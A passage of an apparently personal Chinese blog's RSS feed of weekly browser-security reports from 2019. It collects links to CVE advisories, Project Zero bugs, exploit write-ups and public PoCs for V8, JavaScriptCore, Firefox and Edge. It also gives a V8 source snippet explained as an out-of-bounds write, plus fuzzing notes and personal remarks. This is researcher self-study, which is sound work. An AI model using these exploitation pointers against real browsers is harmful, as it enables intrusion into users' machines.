&lt;p&gt;我们再回到&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Replace&lt;/code&gt;函数里，它竟然可以直接设置这个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lastIndex&lt;/code&gt;位，也就是说，在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Replace&lt;/code&gt;里处理的时候，可以通过&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;toString()&lt;/code&gt;修改掉这个值，而修改的时候，原先的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lastIndex&lt;/code&gt;已经变成了另一个对象的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Map&lt;/code&gt;，这就造成了一个越界写操作，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sticky&lt;/code&gt;对应的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;y&lt;/code&gt;，比如&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;AA/y&quot;&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;if (match_indices_obj-&amp;gt;IsNull(isolate)) {
    if (sticky) regexp-&amp;gt;set_last_index(Smi::kZero, SKIP_WRITE_BARRIER);
        return string;
}

auto match_indices = Handle&amp;lt;RegExpMatchInfo&amp;gt;::cast(match_indices_obj);

const int start_index = match_indices-&amp;gt;Capture(0);
const int end_index = match_indices-&amp;gt;Capture(1);

if (sticky) {
    regexp-&amp;gt;set_last_index(Smi::FromInt(end_index), SKIP_WRITE_BARRIER);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;参加了今年的数字校招面试工作，一共是四批，第一批是内推，剩下三批是大流程，内推的好处就是万一挂了可以参加大流程，完全不会有影响，但是大流程只能参加一次&lt;/p&gt;

&lt;p&gt;整个部门的候选人简历一眼刷下来几乎全是硕士学历，本科生屈指可数，全公司的比例情况我不清楚，没有看到表格&lt;/p&gt;

&lt;p&gt;感慨还好毕业的早，不然今年可能真的找不到工作了&lt;/p&gt;

&lt;p&gt;记得17年的春招，我在寝室里参加了数字的春招视频面试，大早上有个人打电话给我问我能不能参加面试，然后我就早早地在那里准备了，然后时间一到就有面试官Call我，一早上三面聊得很快，一面工程师，二面leader，三面HR&lt;/p&gt;

&lt;p&gt;另外，今年的秋招差不多结束了，春招的时候大家投简历请踊跃一点，不要太羞涩了，有坑，缺人！需要内推360的后台联系我啊！！！！！！&lt;/p&gt;
</description>
                <pubDate>Fri, 25 Oct 2019 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/browser_security/2019/10/25/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E5%91%A8%E6%8A%A5-2019.10.21-2019.10.25.html</link>
                <guid isPermaLink="true">http://localhost:4000/browser_security/2019/10/25/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E5%91%A8%E6%8A%A5-2019.10.21-2019.10.25.html</guid>
            </item>
        
            <item>
                <title>浏览器安全周报 2019.06.17 - 2019.06.21</title>
                <description>&lt;p&gt;整理了最近的一些Poc&lt;/p&gt;

&lt;p&gt;成功在Ubuntu 18.04上编译了ChakraCore和WebKit，ChakraCore挺容易编译的，就是WebKit不好编译，依赖很多，好在还是编译完了&lt;/p&gt;

&lt;p&gt;跑了一个Fuzzer，开始跑出了几个Assert，也算是有收获，写了一个监控脚本去监控Fuzzer的结果，然后发邮件给我，这个东西还是有搞头的，现在的进度是一个小时发一次邮件，每次直接把Crash的Case发我邮箱&lt;/p&gt;

&lt;p&gt;接下来的版本想加几个点：&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;能保活，打算使用bash脚本，并且开机能自启动Fuzzer和后续的一系列监控行为；&lt;/li&gt;
  &lt;li&gt;监控到有新文件再发邮件给我提醒，并且以附件形式发送Crash Case和崩溃信息；&lt;/li&gt;
  &lt;li&gt;使用pwntools自动分析崩溃信息，简单的识别漏洞类型&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;最近因为引擎的编译问题，导致进度缓慢，现在以分析漏洞为主，先把漏洞分析这部分尽快的补上，调试利用后面再统一的学习&lt;/p&gt;

&lt;p&gt;TyphoonCon 2019 上关于攻击 TurboFan 的演讲&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://doar-e.github.io/presentations/typhooncon2019/AttackingTurboFan_TyphoonCon_2019.pdf&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Firefox 更新 67.0.4 版本，修复 CVE-2019-11708 Prompt:Open 沙箱逃逸漏洞&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.mozilla.org/en-US/security/advisories/mfsa2019-19/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Chrome v8引擎为WebAssembly引入了code caching以提高性能&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://v8.dev/blog/wasm-code-caching&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Firefox 更新 67.0.3，修复了 JS 引擎 Array.pop 的一个类型混淆漏洞（CVE-2019-11707）&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.mozilla.org/en-US/security/advisories/mfsa2019-18/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;CVE-2019-5835 swiftshader渲染组件任意读漏洞&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://bugs.chromium.org/p/chromium/issues/detail?id=939239&lt;/li&gt;
&lt;/ul&gt;
</description>
                <pubDate>Fri, 21 Jun 2019 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/browser_security/2019/06/21/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E5%91%A8%E6%8A%A5-2019.06.17-2019.06.21.html</link>
                <guid isPermaLink="true">http://localhost:4000/browser_security/2019/06/21/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E5%91%A8%E6%8A%A5-2019.06.17-2019.06.21.html</guid>
            </item>
        
            <item>
                <title>浏览器安全周报 2019.06.03 - 2019.06.07</title>
                <description>&lt;p&gt;JavaScriptCore 引擎的调试以及 JSObject 是如何实现的&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://liveoverflow.com/the-butterfly-of-jsobject-browser-0x02/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;qwertyoruiop在MOSEC2019上的议题ppt。WeKit/Safari的JavaScriptCore引擎的漏洞案例与利用技术&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;http://iokit.racing/jsctales.pdf&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;对Chrome v8类型系统和JIT给出了概览，并且以CVE-2018-17463为例详细介绍了JIT side effect这一类型的漏洞&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;http://phrack.org/papers/jit_exploitation.html&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;开源基础库libxslt越界读漏洞，可以在Chrome浏览器中触发内存破坏&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://bugs.chromium.org/p/chromium/issues/detail?id=930663&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;1819 - Chrome: Use-after-free in WasmMemoryObject::Grow - project-zero - Monorail&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://bugs.chromium.org/p/project-zero/issues/detail?id=1819&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;V8 引擎编译及调试环境的搭建&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://medium.com/@stankoja/v8-bug-hunting-part-1-setting-up-the-debug-environment-7ef34dc6f2de&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Chrome 75.0.3770.80 修复的软件漏洞列表&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://chromereleases.googleblog.com/2019/06/stable-channel-update-for-desktop.html&lt;/li&gt;
&lt;/ul&gt;
</description>
                <pubDate>Fri, 07 Jun 2019 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/browser_security/2019/06/07/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E5%91%A8%E6%8A%A5-2019.06.03-2019.06.07.html</link>
                <guid isPermaLink="true">http://localhost:4000/browser_security/2019/06/07/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E5%91%A8%E6%8A%A5-2019.06.03-2019.06.07.html</guid>
            </item>
        
            <item>
                <title>浏览器安全周报 2019.05.27 - 2019.05.31</title>
                <description>&lt;p&gt;怠惰的一周&lt;/p&gt;

&lt;p&gt;看了很多WebKit的文章，还是有很多机制不懂&lt;/p&gt;

&lt;p&gt;作者介绍了在今年Pwn2Own中利用一个越界读漏洞实现了Safari沙箱逃逸，然后利用kextutil中存在的TOCTOU获得内核代码执行权限&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://phoenhex.re/2019-05-26/attribution-is-hard-at-least-for-dock&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;FireFox SandBox 中的信息泄露漏洞, 源于未初始化的 CrossCall Handle&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://ssd-disclosure.com/archives/3923/ssd-advisory-firefox-sandbox-infoleak-from-uninitialized-handle-in-crosscall&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;XuWen在zer0con上关于js和DOM fuzz的议题，提出了一种Emulation-based generation的fuzz思路&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://github.com/tarafans/collections/blob/master/ZeroCon2019.pdf&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;CVE-2019-9792 Firefox浏览器脚本引擎漏洞：通过IonMonkey JIT编译器处理branch pruning、Phi elimination的bug，将&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JS_OPTIMIZED_OUT&lt;/code&gt;这一magic value返回到JavaScript脚本上下文，然后进一步造成内存破坏&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://bugs.chromium.org/p/project-zero/issues/detail?id=1794&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Pwn2Own 2019上的Edge沙箱逃逸漏洞，由于manager未正确校验消息来源，导致renderer可以伪造并发送文件下载/打开消息，最终实现沙箱逃逸&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://blog.exodusintel.com/2019/05/27/pwn2own-2019-microsoft-edge-sandbox-escape-cve-2019-0938-part-2/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;V8: InferReceiverMap函数尝试读取prototype slot前未检查其是否存在，导致越界读&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://bugs.chromium.org/p/project-zero/issues/detail?id=1799&lt;/li&gt;
&lt;/ul&gt;
</description>
                <pubDate>Fri, 31 May 2019 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/browser_security/2019/05/31/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E5%91%A8%E6%8A%A5-2019.05.27-2019.05.31.html</link>
                <guid isPermaLink="true">http://localhost:4000/browser_security/2019/05/31/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E5%91%A8%E6%8A%A5-2019.05.27-2019.05.31.html</guid>
            </item>
        
            <item>
                <title>浏览器安全周报 2019.05.20 - 2019.05.24</title>
                <description>&lt;p&gt;再一次读了泉哥的《编译原理在安全领域的应用》，坚定一下学习编译原理的信心，编译原理不啃下来JS引擎多半要停滞不前，挖洞估计也费劲，我可不能找没时间学习这种借口&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;http://riusksk.me/2018/07/21/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%89%E5%85%A8/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;这周浏览器没有学习太多，主要是在写*CTF里那道V8的题解，问题不大，挺简单的，按照之前定的方法，一个漏洞一个漏洞的解决，短期看不到啥效果，长期下来基础才能扎实&lt;/p&gt;

&lt;p&gt;坚定！坚定！坚定！&lt;/p&gt;

&lt;p&gt;以下来自玄武推送&lt;/p&gt;

&lt;p&gt;Firefox发布67版本修复的漏洞列表，我现在会开始看这些东西了，看看现在经常出的漏洞类型以及所在组件&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.mozilla.org/en-US/security/advisories/mfsa2019-13/#CVE-2019-9817&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;循环不变量外提导致的栈未初始化漏洞&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://bugs.chromium.org/p/project-zero/issues/detail?id=1789&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;CVE-2019-8506 针对WebKit JSC “createRegExpMatchesArray does not respect inferred types”的漏洞利用，将类型混淆漏洞转化为addrof/fakeobj两个primitive达到RCE&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;http://lordofpwn.kr/index.php/writeup/cve-2019-8506-javascriptcore-exploit/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;CVE-2019-0940 Pwn2Own 2019上Edge的Canvas 2D API的漏洞和利用的详细分析&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://blog.exodusintel.com/2019/05/19/pwn2own-2019-microsoft-edge-renderer-exploitation-cve-2019-9999-part-1/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;JSC中DFG JIT处理StringObjects的HasIndexedProperty时doesGC()设置错误&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://bugs.chromium.org/p/project-zero/issues/detail?id=1802&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;有点神奇，玄武的大佬最近是组团加我好友来虐我这个安全小萌新嘛？&lt;/p&gt;

&lt;p&gt;如果愿意交流的话，加我微信：1040500943（我的抽屉里有一颗糖），我让你们看看什么是真正的菜逼！&lt;/p&gt;

&lt;p&gt;以前我觉得那些牛人是因为智商高，所以我比不过，但是其实我是懒而已，我还没有努力到要和别人比天赋的程度，再一次深刻认识到处在一个好的环境的重要性，无论是学习还是工作，对自己的额外加成是指数增长，这一点我在一开始学习浏览器安全的时候就深刻认识到了，别人在硬盘里吃灰的资料却是我无论如何都不可得的，而我现在要做的就是比昨天更努力&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;https://mp.weixin.qq.com/s/62niV8pEUSLb_DcdixyV9A&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;我实在是太垃圾了，处在被开除边缘&lt;/p&gt;
</description>
                <pubDate>Fri, 24 May 2019 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/browser_security/2019/05/24/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E5%91%A8%E6%8A%A5-2019.05.20-2019.05.24.html</link>
                <guid isPermaLink="true">http://localhost:4000/browser_security/2019/05/24/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E5%91%A8%E6%8A%A5-2019.05.20-2019.05.24.html</guid>
            </item>
        
            <item>
                <title>浏览器安全周报 2019.05.13 - 2019.05.17</title>
                <description>&lt;p&gt;上周五晚上出了个SQLite3的UAF漏洞，我不太懂数据库，又是一个硬伤&lt;/p&gt;

&lt;p&gt;看了BlackHat 2019的议题，腾讯的Blade Team贼强，中了三个议题，有一个讲的是挖SQLite3的洞，这个我比较感兴趣，我目前很缺源码阅读和审计的能力（感觉自己啥都缺，啥都不会），真的是可以感受到牛逼团队和菜逼团队之间的区别，牛逼团队是真正研究技术，研究出新东西来分享，菜逼团队就会拿一些简单的东西忽悠别人，希望有一天我可以拿出我觉得有自信的成果与别人分享&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/B7DCE82DE7B4D6C35D325B8940B88BAB.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;科恩的师傅有一个讲Chrome的&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/2F83B3C8C3CF61D46F1969B20769787D.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;以下来自玄武推送：&lt;/p&gt;

&lt;p&gt;介绍了V8中如何巧妙地利用GC将一个相对难利用的OOB Read转化成任意地址读写实现RCE的技s巧&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://googleprojectzero.blogspot.com/2019/05/trashing-flow-of-data.html?m=1&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Compiler Bugs and Bug Compilers，来自HITB会议，介绍编译器编译过程以及编译器的Bugs&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://conference.hitb.org/hitbsecconf2019ams/materials/D2T1%20-%20Compiler%20Bugs%20and%20Bug%20Compilers%20-%20Marion%20Marschalek.pdf&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;本文介绍了V8在关闭了CheckBounds的优化之后如何利用Turbofan引擎中Typer型漏洞的技巧&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://doar-e.github.io/blog/2019/05/09/circumventing-chromes-hardening-of-typer-bugs/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;v8: turbofan: JSCallReducer::ReduceArrayIndexOfIncludes 越界读写漏洞，来自 Project Zero&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://bugs.chromium.org/p/project-zero/issues/detail?id=1809&lt;/li&gt;
  &lt;li&gt;https://www.exploit-db.com/exploits/46837?utm_source=dlvr.it&amp;amp;utm_medium=twitter&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Chromium浏览器正在开发对Cross-Origin-Opener-Policy Header的支持，用于限制跨域WindowProxy的访问&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://bugs.chromium.org/p/chromium/issues/detail?id=922191#c9&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Chrome 浏览器开发者工具（DevTools）源码标签页各个功能的详细介绍&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://docs.google.com/presentation/d/1LBTJ6AG3GU_QLrPQSw8Tc5Hj-BWmLYs-0VmR5kGZ144/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;附赠一些iOS和macOS相关的技术：&lt;/p&gt;

&lt;p&gt;macOS Mojave 10.14.4 802.1X组件网络流量劫持逻辑漏洞的PoC&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://github.com/qingxp9/CVE-2019-6203-PoC&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;在QEMU中安装macOS系统，支持KVM加速&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://github.com/foxlet/macOS-Simple-KVM&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;iOS/macOS系统内核、内核扩展新攻击接口的自动化发现和Fuzzing测试&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://conference.hitb.org/hitbsecconf2019ams/materials/D1T2%20-%20Fresh%20Apples%20-%20Researching%20New%20Attack%20Interfaces%20on%20iOS%20and%20OSX%20-%20Moony%20Li%20&amp;amp;%20Lilang%20Wu.pdf&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;mbuf overflow - 在iOS/macOS系统的网络组件中找漏洞&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://conference.hitb.org/hitbsecconf2019ams/materials/D1T1%20-%20MBUF-OFLOW%20-%20Finding%20Vulnerabilities%20in%20iOS%20MacOS%20Networking%20Code%20-%20Kevin%20Backhouse.pdf&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ModJack - 绕过内核加载扩展的安全防护，劫持内核&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://conference.hitb.org/hitbsecconf2019ams/materials/D2T2%20-%20ModJack%20-%20Hijacking%20the%20MacOS%20Kernel%20-%20Zhi%20Zhou.pdf&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;这周学习Swift，iOS开发，然后搞iOS逆向，进度喜人！&lt;/p&gt;

&lt;p&gt;找了几个搞iOS的大佬聊了聊iOS和macOS，还有漏洞相关的技术，听听大佬们的学习建议，现在我是先打算把正向开发学了，然后搞iOS和macOS应用的逆向，再去分析macOS的漏洞，买了两本书：《iOS应用逆向与安全》和《macOS软件安全与逆向分析》，感觉回到了当年学习Android逆向的路线了，我属于那种先正向开发再逆向的那一波&lt;/p&gt;

&lt;p&gt;先学着，感觉学的挺开心的，就是头有点冷&lt;/p&gt;

&lt;p&gt;然后JS和编译原理同步也学着，进度稍慢了一点，但是跟得上计划&lt;/p&gt;

&lt;p&gt;跟年入百万的唐师傅聊了聊，给我建议说多看推，确实可以感觉到推上面的技术交流氛围很好，我现在搜技术资料除了Google，GitHub之外，还会在推上面找找，而且一些国外的一些研究员讲完议题之后直接就会放出Slide，贼nice，我的交际圈还是太限制了，不玩微博也不怎么玩推，朋友都限制在微信里，日常交流靠约饭，接下来努力多跟国内外的师傅们交流技术&lt;/p&gt;

&lt;p&gt;低头看了看自己的啤酒肚，里面墨水越来越少了，都是啤酒！&lt;/p&gt;
</description>
                <pubDate>Fri, 17 May 2019 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/browser_security/2019/05/17/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E5%91%A8%E6%8A%A5-2019.05.13-2019.05.17.html</link>
                <guid isPermaLink="true">http://localhost:4000/browser_security/2019/05/17/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E5%91%A8%E6%8A%A5-2019.05.13-2019.05.17.html</guid>
            </item>
        
            <item>
                <title>浏览器安全周报 2019.05.06 - 2019.05.10</title>
                <description>&lt;p&gt;这周把一些JS引擎模糊测试相关的Paper稍微整理了一下，目前对这部分其实还没有什么清晰的概念，周四的时候有一个公众号发了篇Paper《CodeAlchemist: Semantics-Aware Code Generation to Find Vulnerabilities in JavaScript Engines》的解读，刚好我可以读着看看感觉，代码我还没跑&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://mp.weixin.qq.com/s/cFtiJUnSS3REEYG1N46-fA&lt;/li&gt;
  &lt;li&gt;https://daramg.gift/paper/han-ndss2019.pdf&lt;/li&gt;
  &lt;li&gt;https://github.com/SoftSec-KAIST/CodeAlchemist&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;把之前CRBUG-821137的分析文章补上了利用部分，构造任意读写原语的核心就是下面这张图了，五一之前在组内做了一次分享，讲的就是这个洞，下面这张图是我后来写利用文章的时候补上的，有了这张内存示意图应该就很好理解如何构造出任意读写原语了&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/83542930BD55C1C7EA827C83E2DB1A03.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;一个Chrome泄漏信息的洞，发送&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;com.android.chrome.GPU_PROFILER.START/STOP&lt;/code&gt;广播可以把本机的数据保存到任意的路径&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://bugs.chromium.org/p/chromium/issues/detail?id=922627&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;作者把它保存到了私有目录，所以需要su才能读取，其实是可以写到sdcard的&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/78AE87E95D7D4EB3210BDCD9299B83E4.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;修复方式就是判断系统是不是Debug模式编译的&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://chromium.googlesource.com/chromium/src.git/+/f68b18e1ec1cadb432998d3ccc084e0a8c1ae5cd%5E%21/#F0&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/432842785FE35EA81CDB00748528A4B4.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;这个洞4000刀，我酸菜鱼又酸了&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/F74E25B60E594F23F1E2F05E38F07633.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;继续学习JS，本周的进度不错，最近喜欢看前端的面试题，里面有不少的JS技巧和对细节的深入讲解，有点想加入数字的奇舞团&lt;/p&gt;

&lt;p&gt;以下来自玄武推送&lt;/p&gt;

&lt;p&gt;CVE-2018-0777 ChakraCore JIT LICM漏洞分析， 作者babyJessica，在后端循环优化中对归纳变量进行过度常量折叠使 BoundCheck在LICM过程中被外提，最终导致越界&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://exp101t.blogspot.com/2018/05/cve-2018-0777-code-motion.html&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;CVE-2019-9810 0vercl0k公开Pwn2Own 2019 Richard Zhu和Amat Cama攻破FireFox的漏洞EXP，其中使用到了BigInt来进行利用&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://github.com/0vercl0k/CVE-2019-9810&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;在即将推出的基于Chromium的Edge浏览器中，将支持一种“IE 模式”，用于兼容比较古老的企业内部站点。这个对Edge的安全将有一种“降级” 的影响，以前IE对VBScript和Adobe Flash插件的支持也曾出现过这种“兼容模式”，安全研究员Ivan Fratric关于这个问题的看法：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.computerworld.com/article/3393193/microsoft-will-demote-ie-to-a-mode-inside-edge.html&lt;/li&gt;
  &lt;li&gt;https://twitter.com/ifsecure/status/1126059685168197632&lt;/li&gt;
  &lt;li&gt;https://www.youtube.com/watch?v=E2dm29djv3U&amp;amp;feature=youtu.be&amp;amp;t=372&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;PJ0研究员Saelo在0x41Con上分享的JIT利用技巧，侧重于JIT类型混淆漏洞&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://saelo.github.io/presentations/41con_19_jit_exploitation_tricks.pdf&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;这周还看了下iOS越狱相关的技术，一直觉得iOS和macOS上的利用挺优雅的，蛮有意思，我只是了解下，多接触下隔壁领域的技术，并没有打算上手搞，也许再过几个星期我又去接触路由器了&lt;/p&gt;

&lt;p&gt;From Zero to tfp0 - Part 1: Prologue&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.darkmatter.ae/papers-articles/from-zero-to-tfp0-part-1-prologue/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;From zero to tfp0 - Part 2: Walkthrough of the voucher_swap exploit&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.darkmatter.ae/papers-articles/from-zero-to-tfp0-part-2-a-walkthrough-of-the-voucher_swap-exploit/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Jailbreaks Demystified&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://geosn0w.github.io/Jailbreaks-Demystified/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;腾讯科恩实验室Black Hat USA 2018议题解读 | iOS越狱细节揭秘&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.anquanke.com/post/id/155896&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;这个我之前看过一次，来自今年的35C3，详解越狱的前世今生，只是我当时很菜（现在也菜），看的一知半解的，属于常看常新的文章&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://api.tihmstar.net/35c3slides.pdf&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;俗话说：行走江湖，技多不压身，万一哪天工头发现我是个菜逼把我开除了，我好带着这一啤酒肚乱七八糟的墨水跟另一个工地的工头吹牛逼啊！&lt;/p&gt;
</description>
                <pubDate>Fri, 10 May 2019 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/browser_security/2019/05/10/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E5%91%A8%E6%8A%A5-2019.05.06-2019.05.10.html</link>
                <guid isPermaLink="true">http://localhost:4000/browser_security/2019/05/10/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E5%91%A8%E6%8A%A5-2019.05.06-2019.05.10.html</guid>
            </item>
        
            <item>
                <title>浏览器安全周报 2019.04.29 - 2019.05.03</title>
                <description>&lt;p&gt;怠惰的我啊！&lt;/p&gt;

&lt;p&gt;这周看的东西少，毕竟很久没有回过家了，放假前掰着手指头数着回家还有几天&lt;/p&gt;

&lt;p&gt;一个讲如何在V8的Parser里面挖洞的文章，我觉得挺有意思的，现在JS引擎是一个重头，研究下其它模块或许是一个好的产出点&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://labs.bluefrostsecurity.de/blog/2019/04/29/dont-follow-the-masses-bug-hunting-in-javascript-engines/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;dwfault师傅写了一篇JSC LICM机制的文章，我看不懂。。。。。。，想来之前还加了师傅的微信&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;http://dwfault-blog.imwork.net:30916/2019/04/27/CVE-2019-8518%20FTL%20LICM%20GetByVal%20hoisted%20OOB/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;又看了一遍《浏览器的工作原理：新式网络浏览器幕后揭秘》，这篇文章属于常看常新那种，这篇是翻译的，其实现在看还是有大量的知识点理解的很浅或者几乎没理解，但是每次看都可以发现之前没理解的一些知识点现在可以理解了&lt;/p&gt;
&lt;ul&gt;
